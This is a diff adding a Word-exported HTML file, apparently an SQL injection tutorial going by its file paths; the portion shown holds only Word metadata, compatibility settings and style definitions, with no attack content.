@@ -1,1 +1,1321 @@
+<html xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns:m="http://schemas.microsoft.com/office/2004/12/omml"
+xmlns="http://www.w3.org/TR/REC-html40">
 
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=gb2312">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 15">
+<meta name=Originator content="Microsoft Word 15">
+<link rel=File-List href="SQL注入攻击原理%20实战演练.files/filelist.xml">
+<link rel=Edit-Time-Data href="SQL注入攻击原理%20实战演练.files/editdata.mso">
+<!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+w\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Microsoft 帐户</o:Author>
+  <o:LastAuthor>Microsoft 帐户</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>26</o:TotalTime>
+  <o:Created>2026-07-20T06:13:00Z</o:Created>
+  <o:LastSaved>2026-07-20T06:13:00Z</o:LastSaved>
+  <o:Pages>11</o:Pages>
+  <o:Words>286</o:Words>
+  <o:Characters>1636</o:Characters>
+  <o:Lines>13</o:Lines>
+  <o:Paragraphs>3</o:Paragraphs>
+  <o:CharactersWithSpaces>1919</o:CharactersWithSpaces>
+  <o:Version>15.00</o:Version>
+ </o:DocumentProperties>
+ <o:OfficeDocumentSettings>
+  <o:AllowPNG/>
+ </o:OfficeDocumentSettings>
+</xml><![endif]-->
+<link rel=themeData href="SQL注入攻击原理%20实战演练.files/themedata.thmx">
+<link rel=colorSchemeMapping
+href="SQL注入攻击原理%20实战演练.files/colorschememapping.xml">
+<!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:SpellingState>Clean</w:SpellingState>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:TrackMoves>false</w:TrackMoves>
+  <w:TrackFormatting/>
+  <w:PunctuationKerning/>
+  <w:DrawingGridHorizontalSpacing>5.25 磅</w:DrawingGridHorizontalSpacing>
+  <w:DrawingGridVerticalSpacing>7.8 磅</w:DrawingGridVerticalSpacing>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery>
+  <w:ValidateAgainstSchemas/>
+  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
+  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
+  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
+  <w:DoNotPromoteQF/>
+  <w:LidThemeOther>EN-US</w:LidThemeOther>
+  <w:LidThemeAsian>ZH-CN</w:LidThemeAsian>
+  <w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript>
+  <w:Compatibility>
+   <w:SpaceForUL/>
+   <w:BalanceSingleByteDoubleByteWidth/>
+   <w:DoNotLeaveBackslashAlone/>
+   <w:ULTrailSpace/>
+   <w:DoNotExpandShiftReturn/>
+   <w:AdjustLineHeightInTable/>
+   <w:BreakWrappedTables/>
+   <w:SnapToGridInCell/>
+   <w:WrapTextWithPunct/>
+   <w:UseAsianBreakRules/>
+   <w:DontGrowAutofit/>
+   <w:SplitPgBreakAndParaMark/>
+   <w:EnableOpenTypeKerning/>
+   <w:DontFlipMirrorIndents/>
+   <w:OverrideTableStyleHps/>
+   <w:UseFELayout/>
+  </w:Compatibility>
+  <m:mathPr>
+   <m:mathFont m:val="Cambria Math"/>
+   <m:brkBin m:val="before"/>
+   <m:brkBinSub m:val="&#45;-"/>
+   <m:smallFrac m:val="off"/>
+   <m:dispDef/>
+   <m:lMargin m:val="0"/>
+   <m:rMargin m:val="0"/>
+   <m:defJc m:val="centerGroup"/>
+   <m:wrapIndent m:val="1440"/>
+   <m:intLim m:val="subSup"/>
+   <m:naryLim m:val="undOvr"/>
+  </m:mathPr></w:WordDocument>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="false"
+  DefSemiHidden="false" DefQFormat="false" DefPriority="99"
+  LatentStyleCount="371">
+  <w:LsdException Locked="false" Priority="0" QFormat="true" Name="Normal"/>
+  <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 1"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 2"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 3"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 4"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 5"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 6"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 7"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 8"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 9"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 7"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 8"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 9"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 1"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 2"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 3"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 4"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 5"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 6"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 7"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 8"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 9"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Normal Indent"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="footnote text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="annotation text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="header"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="footer"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index heading"/>
+  <w:LsdException Locked="false" Priority="35" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="caption"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="table of figures"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="envelope address"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="envelope return"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="footnote reference"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="annotation reference"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="line number"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="page number"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="endnote reference"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="endnote text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="table of authorities"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="macro"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="toa heading"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 5"/>
+  <w:LsdException Locked="false" Priority="10" QFormat="true" Name="Title"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Closing"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Signature"/>
+  <w:LsdException Locked="false" Priority="1" SemiHidden="true"
+   UnhideWhenUsed="true" Name="Default Paragraph Font"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text Indent"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Message Header"/>
+  <w:LsdException Locked="false" Priority="11" QFormat="true" Name="Subtitle"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Salutation"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Date"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text First Indent"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text First Indent 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Note Heading"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text Indent 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text Indent 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Block Text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Hyperlink"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="FollowedHyperlink"/>
+  <w:LsdException Locked="false" Priority="22" QFormat="true" Name="Strong"/>
+  <w:LsdException Locked="false" Priority="20" QFormat="true" Name="Emphasis"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Document Map"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Plain Text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="E-mail Signature"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Top of Form"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Bottom of Form"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Normal (Web)"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Acronym"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Address"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Cite"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Code"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Definition"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Keyboard"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Preformatted"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Sample"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Typewriter"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Variable"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Normal Table"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="annotation subject"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="No List"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Outline List 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Outline List 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Outline List 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Simple 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Simple 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Simple 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Colorful 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Colorful 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Colorful 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 7"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 8"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 7"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 8"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table 3D effects 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table 3D effects 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table 3D effects 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Contemporary"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Elegant"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Professional"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Subtle 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Subtle 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Web 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Web 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Web 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Balloon Text"/>
+  <w:LsdException Locked="false" Priority="39" Name="Table Grid"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Theme"/>
+  <w:LsdException Locked="false" SemiHidden="true" Name="Placeholder Text"/>
+  <w:LsdException Locked="false" Priority="1" QFormat="true" Name="No Spacing"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 1"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 1"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 1"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 1"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" Name="Revision"/>
+  <w:LsdException Locked="false" Priority="34" QFormat="true"
+   Name="List Paragraph"/>
+  <w:LsdException Locked="false" Priority="29" QFormat="true" Name="Quote"/>
+  <w:LsdException Locked="false" Priority="30" QFormat="true"
+   Name="Intense Quote"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 1"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 1"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 1"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 1"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 1"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 1"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 2"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 2"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 2"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 2"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 2"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 2"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 2"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 2"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 2"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 2"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 2"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 3"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 3"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 3"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 3"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 3"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 3"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 3"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 3"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 3"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 3"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 3"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 4"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 4"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 4"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 4"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 4"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 4"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 4"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 4"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 4"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 4"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 4"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 5"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 5"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 5"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 5"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 5"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 5"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 5"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 5"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 5"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 5"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 5"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 6"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 6"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 6"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 6"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 6"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 6"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 6"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 6"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 6"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 6"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 6"/>
+  <w:LsdException Locked="false" Priority="19" QFormat="true"
+   Name="Subtle Emphasis"/>
+  <w:LsdException Locked="false" Priority="21" QFormat="true"
+   Name="Intense Emphasis"/>
+  <w:LsdException Locked="false" Priority="31" QFormat="true"
+   Name="Subtle Reference"/>
+  <w:LsdException Locked="false" Priority="32" QFormat="true"
+   Name="Intense Reference"/>
+  <w:LsdException Locked="false" Priority="33" QFormat="true" Name="Book Title"/>
+  <w:LsdException Locked="false" Priority="37" SemiHidden="true"
+   UnhideWhenUsed="true" Name="Bibliography"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="TOC Heading"/>
+  <w:LsdException Locked="false" Priority="41" Name="Plain Table 1"/>
+  <w:LsdException Locked="false" Priority="42" Name="Plain Table 2"/>
+  <w:LsdException Locked="false" Priority="43" Name="Plain Table 3"/>
+  <w:LsdException Locked="false" Priority="44" Name="Plain Table 4"/>
